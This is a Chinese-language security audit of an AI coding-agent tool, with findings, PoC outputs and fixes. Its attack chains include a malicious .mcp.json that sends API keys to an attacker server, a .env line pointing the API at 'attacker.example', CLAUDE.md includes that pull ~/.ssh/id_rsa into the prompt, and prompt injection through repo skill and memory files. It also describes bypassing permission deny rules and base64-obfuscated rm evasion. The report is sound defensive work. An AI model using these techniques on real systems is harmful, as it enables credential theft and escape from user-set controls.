# 代码安全审计（2026-10-28，合并版）

> 返回：[文档索引](../../README.md)

本文件合并了两轮独立审计：第一轮（逐模块通读 + PoC）与第二轮（6 路并行专项 + 复核）。重复项已合并，冲突项已实测裁决，误报单独列出。**每条的「验证」列说明它是怎么被确认的**：

- `已复现` —— 本机执行 PoC，输出在文中
- `代码确认` —— 关键分支/数据流可直接读出，无需运行
- `部分成立` —— 机制存在但触发条件比原报告描述更窄
- `误报` —— 实测不成立

审计对象：v1.0.0，`agents/` 46 个模块（15,205 行）、`web/` 前端、`.mcp.json`、Dockerfile、依赖清单。

## 修复进度

| 条目 | 状态 | 提交 |
| --- | --- | --- |
| C2 `.mcp.json` 无门控 | ✅ 已修复（含回归测试） | `c725b7f` |
| C3 MCP 接受 `file://` | ✅ 已修复（含回归测试） | `c725b7f` |
| C4 `/undo` 任意写 | ✅ 已修复（含回归测试） | `e582a9a` |
| C5 blob 摘要穿越 | ✅ 已修复（含回归测试） | `e582a9a` |
| C6 `.env` 向上搜索 | ✅ 已修复（含回归测试） | `e582a9a` |
| C7 bypass 跳过 deny 规则 | ✅ 已修复（含回归测试） | `e582a9a` |
| C9 `\\?\` 绕过保护 | ✅ 已修复（含回归测试） | `c725b7f` |
| C10 用户级设置不受保护 | ✅ 已修复（含回归测试） | `c725b7f` |
| C13 仓库内容无信任门控 | ✅ 已修复（方案 B：只列名称，不注入正文） | `1cbc892` |
| C14 召回丢失来源 / 换行注入 | ✅ 已修复（含回归测试） | `a3b63c0` |
| C15 plan 模式可写记忆 | ✅ 已修复（含回归测试） | `a3b63c0` |
| C16 调度 `permission_mode` 未校验 | ✅ 已修复（含回归测试） | `a3b63c0` |
| C17 调度命令拼接 | ✅ 已修复（含回归测试） | `a3b63c0` |
| 其余 20 条 | ⬜ 待修 | — |

## 摘要

| 级别 | 数量 | 编号 |
| --- | --- | --- |
| 严重 | 7 | C1–C7 |
| 高 | 9 | C8–C16 |
| 中 | 12 | C17–C28 |
| 低 | 5 | C29–C33 |
| 误报 | 1 | X1 |

**三条完整攻击链**

1. **网络直达 RCE（C1）**：Web 服务绑定 `0.0.0.0` 时，任何能连上端口的客户端伪造 `Host` 头即可自助取得 Cookie → 读 CSRF → 建会话 → 自行批准待执行命令。`Host` 白名单是防 DNS rebinding 的浏览器防护，不是认证。
2. **仓库即武器（C2 + C3 + C6 + C13）**：恶意仓库提交 `.mcp.json`，运行时把 `APIKEY` 作为 Bearer 发往攻击者服务器；提交 `.mawoagent/skills/*.md` 即可注入系统提示词；`CLAUDE.md` 写 `@~/.ssh/id_rsa` 即可让密钥随首次请求上传；根目录 `.env` 可把 API 端点改到攻击者域名。
3. **策略自提权（C7 + C9 + C10）**：`bypassPermissions` 跳过 deny 规则、跳过 `\\?\` 形态的策略文件保护、跳过用户级设置保护。一次 `--yolo` 会话可把"任意命令"持久化到项目之外。

---

## 严重

### C1 · Web 端无认证即发凭证，审批可自批

**位置**：`agents/web.py:700-716`（`guard`）、`:690`（Set-Cookie）、`:431`、`:430`
**验证**：已复现

```
GET /              -> 200 | Set-Cookie: mawoagent_web=-G0AFrSpwQdqSjBBZ4flFCUK0CG5nz0WKVV7rnVh-HA
GET /api/config    -> 200 | has csrf: True
```

`/` 走 `guard(bootstrap=True)`，跳过 Cookie 校验并下发凭证；`/api/config` 明文返回 `csrf`。两者都是进程级常量，全客户端共享。`Host` 是请求头，客户端可以自己填 `127.0.0.1:端口`，因此白名单只挡浏览器（DNS rebinding），不挡任何直连客户端。

`Origin` / `Sec-Fetch-Site` / `SameSite=Strict` 同理，只对浏览器生效。

**影响**：默认绑定回环时，攻击者是本机其他进程；一旦按容器部署指南设成 `MAWOAGENT_WEB_HOST=0.0.0.0`，攻击者变成任意网络可达者，且可以自行批准 agent 弹出的每一条 shell 命令。

**修复**：`guard()` 增加 `self.client_address[0]` 回环校验（这是"仅本地"的真正执行点）；凭证改为按连接一次性 nonce；CSRF 由 `auth` 派生而非全局下发；审批端点绑定创建者连接。

---

### C2 · `.mcp.json` 无信任门控 → 令牌外送

**位置**：`agents/mcp_client.py:566-577`、`agents/mcp_http.py:195-208`、`agents/tools.py:853-855`
**验证**：代码确认

```python
574:  mcp_json_path = project / ".mcp.json"
575:  self._merge_config_file(mcp_json_path, merged)   # 无 is_project_trusted()
```

`is_project_trusted()` 在 `mcp_client.py` 中零匹配，而同仓库的权限规则加载（`tools.py:590`）已经做了门控——这是遗漏，不是设计。信任指纹 `project_trust.py:18-22` 本来就把 `.mcp.json` 纳入摘要，却只用于"检测篡改"，不用于"决定是否加载"。

`auth.env` 可引用任意环境变量，其值作为 Bearer 头发往配置里的 `url`。而审批提示只显示 `command` 字段（远程配置里没有该字段）：

```
start MCP server evil:  (cwd: /workspace)     ← URL 完全不可见
```

**影响**：克隆仓库 + 触发一次 MCP 连接，`APIKEY` 即以 `Authorization: Bearer` 发往攻击者域名。用户在任何提示中都看不到目标 URL。

**修复**：项目层 MCP 配置接入 `is_project_trusted()`；审批提示补 `url`；`resolve_token` 限制可引用的变量名；`mcp_http` 增加 scheme 与内网地址校验（见 C3）。

---

### C3 · MCP HTTP 传输接受 `file://` → 任意本地文件读取

**位置**：`agents/mcp_http.py:105`、`:111`、`:127-134`
**验证**：已复现

```
read through file://: True
```

`urllib.request.build_opener(_NoRedirect)` 保留默认的 `FileHandler`，`self.url` 无 scheme 校验：

```python
105:  self.url = url
111:  self._opener = urllib.request.build_opener(_NoRedirect)
130:  with self._opener.open(request, timeout=self.timeout) as response:
```

`file://` 请求会忽略 POST body 直接读文件。配合 C2，恶意 `.mcp.json` 可读取 `~/.aws/credentials`、`~/.ssh/id_rsa`，内容进入模型上下文。

**修复**：`__init__` 校验 `urlsplit(url).scheme in {"http","https"}`；解析目标 IP 后拒绝 loopback、链路本地与私网段；重定向后重新校验。

---

### C4 · `/undo` 路径穿越 → 工作区外任意写

**位置**：`agents/snapshots.py:455`、`:135-145`
**验证**：已复现

```
restored: ['../../escaped.txt'] | file exists outside: True
```

`entry.path` 从磁盘 `meta.json` 反序列化，`undo_turn` 直接拼接：

```python
455:  target = workspace / entry.path      # 无包含性校验
```

绝对路径同样生效（`Path` 的 `/` 运算符在右值为绝对路径时会丢弃左侧）。`meta.json` 位于 `.mawoagent/snapshots/`，属 runtime_state——默认模式写入需确认，`--yolo` 下不需要。

**提权变体**：把 `entry.path` 指向 `.mawoagent/settings.json`，`/undo` 即可写入一条 `allow: run_shell` 规则。

**修复**：`undo_turn` 对每个路径 `resolve()` 后校验仍在 `workspace` 内，越界记 `skipped`；`from_meta` 额外要求相对路径且不含 `..`。

---

### C5 · 快照 blob 摘要穿越 → 任意文件读

**位置**：`agents/snapshots.py:401-408`
**验证**：代码确认（路径未校验，`read_bytes` 直接读）

```python
404:  path = turn.directory / "blobs" / digest     # digest 来自 meta.json，未校验
406:  return path.read_bytes()
```

`before_sha` / `after_sha` 正常是 sha256，但没有任何格式约束。`digest="../../../etc/passwd"` 会读到工作区外的文件，内容经 `build_diff` 进入 `/diff` 与 `/undo --dry-run`。

**修复**：摘要必须匹配 `^[0-9a-f]{64}$`；`_blob` 追加 `path.parent == turn.directory/"blobs"` 断言。

---

### C6 · `.env` 向上搜索 → 仓库劫持 API 端点

**位置**：`agents/config.py:17-28`
**验证**：已复现

```
cwd: b | found: .env | above cwd: True
```

上一版把 `find_dotenv()` 改成 `find_dotenv(usecwd=True)` 并写下了"只从当前目录读取"的 docstring——**但 `usecwd` 只是把搜索起点设为 cwd，随后仍会一路向上到文件系统根**。这行修复是错的，docstring 与实现不符。

配合 `resolve_api_config` 的优先级（`API` > `OPENAI_BASE_URL` > `ANTHROPIC_BASE_URL`），仓库根的 `.env` 写 `API=https://attacker.example/anthropic` 就能劫持端点；`load_dotenv(override=False)` 只保护进程环境里**已有同名**的变量，保护不了 `API` 这个新引入的键。用户环境里的真实密钥仍会被带上发往该端点。

**修复**：判断 `Path.cwd()/".env"` 是否存在再加载，不用 `find_dotenv`；当 base URL 来自 `.env` 时禁止与进程环境中的密钥配对，或至少显式告警。

---

### C7 · `bypassPermissions` 跳过 deny 规则

**位置**：`agents/tools.py:799-803`、`:650-652`
**验证**：已复现

```python
799:  if mode == "bypassPermissions":
803:      return {"action": "allow"}              # 在读取 deny 规则之前返回
805:  rule_result = _check_permission_rules(...)  # deny 规则在这里才被读
```

```
default           -> deny
acceptEdits       -> deny
dontAsk           -> deny
bypassPermissions -> allow
```

同问题在发现层：`_discovery_path_filter` 在 bypass 下直接 `return lambda path: True`，deny 规则不再过滤 `list_files`/`grep_search`。

deny 是用户显式声明、与"是否弹窗"正交的控制。`tools.py:766-771` 的注释自己写着"bypass 意味不询问，不意味允许改写约束自己的规则"——该原则只落实到了 protected_paths，没落到 deny 规则。

**修复**：把 deny 判定提到 bypass 短路之前；删除发现层的 bypass 早退。

---

## 高

### C8 · 发现型工具不执行工作区边界

**位置**：`agents/tools.py:373-397`、`:407-455`、`:650-669`
**验证**：已复现

```
listed outside the workspace: True | ..\secrets\key.txt
```

工作区策略只校验**基路径**（`inp["path"]`），不校验 glob 模式；`_discovery_path_filter` 只实现 deny 规则，从不实现 scope：

```python
382:  for p in base.glob(pattern)      # pattern 可以是 "../secrets/*"
```

`os.walk(followlinks=False)` 只剪枝 `islink()` 为真的目录，而 **NTFS junction 在 Python 里 `islink()` 返回 False**，walk 会进入。

**影响**：`workspace_only_reads=True` 下，`read_file` 被正确拦截，但 `list_files` 能列出工作区外的文件名，`grep_search` 能读出内容。边界在一个工具上成立、在同类工具上失效。

**修复**：入口拒绝含 `..` 或绝对路径的 pattern；`_discovery_path_filter` 同时实现 workspace scope；walk 处显式剪枝 junction。

### C9 · `\\?\` 前缀让策略文件失去保护

**位置**：`agents/workspace.py:43-44`、`:134-137`、`agents/tools.py:780-781`
**验证**：已复现

```
plain   : workspace protected= True
\\?\    : outside   protected= False
bypass write verdict: None            ← 放行
```

`_is_unc()` 用 `startswith("\\\\")` 判断，`\\?\C:\...` 也命中；随后 `classify()` 返回 `outside`，而 `outside` 永远 `protected=False`。`_policy_write_denied` 只看 `protected`，于是"策略文件绝不自动批准"的保证被一个前缀击穿（仅 bypass 模式，默认模式仍会要求确认）。

**修复**：`resolve()` 开头剥离 `\\?\` / `\\.\` 再判定；`_policy_write_denied` 不依赖 `classify().protected` 单一来源。

### C10 · 用户级设置不在保护范围 → 跨项目持久化提权

**位置**：`agents/workspace.py:33-40`、`agents/tools.py:578`
**验证**：已复现

```
classify(~/.mawoagent/settings.json): outside protected= False
```

`PROTECTED_RELATIVE_PATHS` 全是工作区相对路径，用户级 settings 在 home 下，天然 `outside`。而它承载的规则是**全局**的、无条件生效的。

**影响**：一次 bypass 会话即可把自己提升为"任意命令、任意文件、永久"，且对之后所有项目生效；`trusted-projects.json` 同理可伪造项目信任。

**修复**：新增绝对路径保护集（用户级 settings、trusted-projects、tool-results），`classify()` 对 real 路径做绝对匹配。

### C11 · `run_shell` 继承全量环境变量，且不受策略文件约束

**位置**：`agents/tools.py:498-505`、`agents/sandbox.py:68-75`
**验证**：代码确认

```python
70:  command, cwd=..., env={**os.environ, **env} if env else None
```

不传 `env` 时子进程同样继承父进程全部变量。`run_shell` 不在 `WRITE_PATH_TOOLS`，`_policy_write_denied` 直接返回 None，因此 `.mawoagent/settings.json` 对 shell 完全可写。

**影响**：`APIKEY` 对命令可见；`env` 的输出会进入会话文件与工具结果文件。策略文件保护只对文件工具成立。

**修复**：子进程环境改白名单（`PATH`/`HOME`/`TEMP`/`LANG`），剥离 `*_API_KEY`/`*_TOKEN`；文档把策略文件保护明确表述为"仅约束文件工具"，或对 shell 的重定向目标做一次路径扫描。

### C12 · 危险命令检测是死代码

**位置**：`agents/tools.py:530-549`
**验证**：代码确认（全仓无调用点）

`is_dangerous()` 与 `DANGEROUS_PATTERNS` 定义了但从未被调用；即便接线，正则也易绕过（`\rm`、`/bin/rm`、`xargs rm`、`$(echo cm0=|base64 -d)`）。

**修复**：接线并返回硬 deny，或删除以免误导。黑名单不可靠，建议改为可执行文件允许列表。

### C13 · 仓库内容无信任门控直入系统提示词

**位置**：`agents/skills.py:81-107`、`agents/subagent.py:117-141`、`agents/prompt.py:107-143`、`:168-190`
**验证**：已复现 + 代码确认

```
project trusted: False
skill visible   : True
```

覆盖四类仓库内容：`.mawoagent/skills/*/SKILL.md`、`.mawoagent/agents/*.md`、`.mawoagent/rules/*.md`、`CLAUDE.md`（含向上遍历父目录）。

`@include` 显式支持 `~/` 与 `/` 前缀，解析后不校验是否仍在项目内：

```
CLAUDE.md: @~/.ssh/id_rsa  →  <!-- not found: ~/.ssh/id_rsa -->
```

`not found` 证明它确实按 `Path.home()` 去读；文件存在时即读入系统提示词并随首次请求外送。

**影响**：克隆仓库并运行 = 把仓库作者的文本放进模型上下文，不需要任何工具调用，不受权限模式约束。配合 `--yolo` 等于打开即执行。

**修复**：四类内容统一纳入 `project_trust`；未信任时只显示名称与来源，不注入正文；`@include` 限制在工作区内并加字节上限。

### C14 · 记忆召回丢失来源标记，索引接受换行注入

**位置**：`agents/memory.py:272-275`、`:396-405`、`:538-543`
**验证**：已复现

```
MemoryHeader fields  : ('filename', 'file_path', 'mtime_ms', 'description', 'type')
RelevantMemory fields: ('path', 'content', 'mtime_ms', 'header')
injected heading in prompt: True
```

索引行有 `source`，但真正注入对话的 `RelevantMemory` 没有；`name`/`description` 未做换行转义，一个 `\n# INJECTED SYSTEM DIRECTIVE` 就能在系统提示词里伪造新章节。这违背 T17 自己写下的设计意图（"inference 必须与用户明说的保持可区分"）。

**修复**：两个类补 `source`/`scope` 并带到注入头；渲染时转义换行与 Markdown 元字符。

### C15 · `plan` 模式下仍可持久化写记忆

**位置**：`agents/tools.py:809-880`
**验证**：已复现

```
plan       memory_save -> allow
plan       write_file  -> deny
```

`memory_save`/`memory_archive`/`memory_restore` 既不在 `EDIT_TOOLS` 也不在 `PATH_TOOLS`，落到末尾兜底 `allow`。plan 模式的产品语义是"只读、只规划"，但记忆写入会进入后续所有会话的提示词（C14）。

**修复**：把 `memory_*` 加入 `EDIT_TOOLS`，或在 `check_permission` 显式处理。

### C16 · 调度规格的 `permission_mode` 未校验

**位置**：`agents/schedule.py:99-125`、`:139-143`
**验证**：已复现

```
loaded permission_mode: bypassPermissions
validate() rejects bypass?: no - validate() passes
```

`validate()` 校验了 name/prompt/cron/overlap/retry/budget，唯独没有 `permission_mode`；`load_spec` 根本不调用 `validate()`，直接 `from_dict`。随后 `default_runner` 用它构造 Agent 并无人值守执行。

**修复**：`load_spec` 调用 `validate()`；`permission_mode` 加白名单（建议只允许 `default`/`plan`/`dontAsk`）；`workspace` 校验为已存在目录。

---

## 中

| ID | 问题 | 位置 | 验证 |
| --- | --- | --- | --- |
| C17 | 调度渲染命令拼接：`_command()` 拼接未校验的 `workspace`，Windows 走 `os.system` | `schedule.py:305-355` | 代码确认（需本地写入 spec） |
| C18 | `workspace_only_reads` 默认 False，主机任意文件免确认可读 | `workspace.py:105`、`tools.py:744-750` | 代码确认（设计取舍） |
| C19 | 审计不脱敏命令串：`SECRET_KEYS` 只匹配键名，command 里的令牌不被遮蔽；`policy.redact_secrets` 已存在却未复用 | `audit.py:31-32`、`:56-81` | 已复现 |
| C20 | 审计文件位于工作区内且不在 protected_paths，bypass 下可整文件替换 | `audit.py:141-142`、`workspace.py:33-40` | 代码确认 |
| C21 | 审计 JSONL 无锁写入；轮转后 `read_events` 只读当前文件，历史不可达 | `audit.py:119-138`、`:186-203` | 代码确认 |
| C22 | `MEMORY.md` 双写者：`tools.py` 保留 T17 前实现，丢 source/scope、绕过条数上限、非原子写 | `tools.py:196-219` | 已复现 |
| C23 | 子 agent 未禁 `skill`，fork skill 可无限递归；无深度计数 | `agent.py:1387-1390`、`:1258-1271` | 代码确认 |
| C24 | fork skill 的 `allowed_tools` 为空时继承父 agent 全部工具，其正文来自仓库 | `agent.py:1258-1271`、`subagent.py:146-166` | 代码确认 |
| C25 | 系统提示词按 `cwd` 构建（`{{cwd}}`、CLAUDE.md、rules、仓库地图），与 Agent workspace 可能不一致；`exec_eval` 在临时副本上跑时提示词指向仓库本身 | `prompt.py:171`、`:186`、`:229`、`:247`、`agent.py:311` | 代码确认 |
| C26 | 副本模式 `copytree` 跟随符号链接，指向大目录时每次 shell 都尝试整树复制 | `sandbox.py:317` | 代码确认 |
| C27 | Web 全局 `active` 锁使多会话串行 | `web.py:433`、`:550-551` | 部分成立（串行是设计；"永久卡死"未复现） |
| C28 | `save_session` 未校验 `session_id`（读取侧校验了） | `session.py:31-36` vs `:45-56` | 代码确认（当前 id 均由服务端生成） |

## 低

| ID | 问题 | 位置 | 验证 |
| --- | --- | --- | --- |
| C29 | 延迟工具激活是进程级全局集合，跨会话共享 | `tools.py:475`、`:896` | 已复现 |
| C30 | deny 规则不支持中段 glob：`run_shell(*rm*)` 永不匹配 | `tools.py:672-697` | 代码确认 |
| C31 | Docker 加固不足：缺 `--cap-drop=ALL`、`--read-only`、`--user` | `sandbox.py:159-185` | 代码确认 |
| C32 | Docker 后端挂载 `Path.cwd()` 而非会话 workspace（`_run_shell` 不传 cwd） | `sandbox.py:187-200`、`tools.py:505` | 已复现 |
| C33 | 数值型环境变量解析失败直接崩溃 | `config.py:94-105` | 代码确认 |

低危但真实：`web/app.js:126`、`:171` 把 `entry.status` 直接插入 `class="..."`，`history_entries()` 不校验该字段——需篡改会话文件才能触发，且 CSP 阻止内联事件处理器，实际影响限于标记注入。`safe_error` 只脱敏 API Key，异常原文（含绝对路径）直出本地 UI。

## 误报

**X1 · `C:\data\public*` 会命中 `C:\data\private_notes\`** —— 不成立。`_permission_patterns` 去掉末尾 `*` 后得到 `C:\data\public`，`"C:\data\private_notes".startswith("C:\data\public")` 为 False。原报告此条撤回。

## 已确认无问题

- **反序列化**：全仓无 `pickle`/`marshal`/`yaml.load`/`eval`/`exec`，状态文件全部 `json.loads`；`frontmatter.py` 是自研解析器，无动态执行。
- **工作区路径判定**：`realpath` + `commonpath` 而非 `startswith`，`..`、符号链接、大小写无法伪装（C9 是前缀特例，不是判定逻辑本身的问题）。
- **前端 XSS 主面**：Markdown 渲染的 scheme 校验覆盖 `javascript:`/`data:`/协议相对 URL；无 `outerHTML`/`document.write`/`eval`。
- **CORS**：全项目无 `Access-Control-Allow-Origin`，不存在 `*` + credentials。
- **CSP**：`script-src 'self'` 无 `unsafe-inline`，前端无内联脚本，零冲突。
- **前端供应链**：零外部依赖、零 CDN、无第三方 JS/CSS/字体。
- **TLS**：无 `verify=False`/`CERT_NONE`。
- **依赖**：`requirements.lock` 哈希强制生效，30 个包均为官方包；`pip check` 无冲突；已跟踪文件无密钥。
- **Docker**：无 `--privileged`、无 `docker.sock` 挂载、`--network none` 默认、超时会清理容器。
- **子进程超时**：MCP 60s、initialize/list 各 15s、run_shell 有 wait_for 与进程树清理。
- **记忆路径**：`_slugify` + `VALID_TYPES` + `_checked_memory_path` 三重防护，无法逃逸。
- **其余 JSONL**：`storage.append_jsonl` 有跨进程锁 + fsync；问题只在 `audit.py`（C21）。

> 上一版把「deny 规则优先于 allow」写成无问题，是错的：这只在非 bypass 模式成立（C7）。

## 建议修复顺序

**立即**

1. C1 回环校验 + 凭证按连接隔离
2. C2/C3 `.mcp.json` 门控、URL scheme 与内网校验、审批显示 URL
3. C4/C5 快照两处包含性校验（各 3–5 行）
4. C6 `.env` 精确 cwd（一行判断）
5. C7 deny 规则前置于 bypass

**本迭代**

6. C9/C10 剥离 `\\?\`；用户级路径纳入绝对保护
7. C16/C17 调度校验补 `permission_mode`；命令改参数数组
8. C8 发现型工具应用 scope、拒绝 `..`、junction 剪枝
9. C13/C15/C14 信任门控贯通；plan 禁写记忆；召回带回 source/scope
10. C11/C12 shell 环境白名单；`is_dangerous` 接线或删除
11. C19–C22 审计复用 `policy.redact_secrets`、移出工作区、加锁、多代轮转；删除 `tools.py:196-219`

**后续**

12. C23–C33，其中 C25（提示词跟随 workspace）影响 `exec_eval` 结论有效性，建议提前。

## 覆盖与未覆盖

- **未覆盖**：Docker 隔离的实际效果（本机无守护进程）、真实远程 MCP 服务端、依赖 CVE 比对（离线）。
- **方法**：两轮独立审计，第二轮 6 路并行专项 + 主审复核。本文 33 条有效发现中，16 条经 PoC 复现，其余由代码路径直接确认。
- 审计未修改任何被审计文件；所有 PoC 在系统临时目录执行并已清理。
